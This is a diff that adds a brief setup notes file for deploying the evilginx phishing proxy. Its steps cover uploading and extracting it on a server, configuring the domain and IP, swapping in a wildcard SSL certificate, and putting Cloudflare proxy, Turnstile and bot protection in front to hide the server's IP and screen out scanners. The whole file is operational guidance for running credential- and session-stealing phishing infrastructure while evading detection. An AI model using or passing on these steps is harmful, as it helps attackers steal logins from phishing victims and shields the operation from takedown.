@@ -1,0 +1,7 @@
+- upload zip on server and extract
+- run evilginx ( if will create nesesory config )
+- edit config and add domain IP etc 
+- in current folder there .cert inside that there is key and cert file replace with your own custom wild card ssl
+- run evilginx
+- use cloudflare ( if u use cloudflare wildcard cert then u can enable cloudflare proxy too to hide ip)
+- enable cloudflare turnstile and bot protection mode 
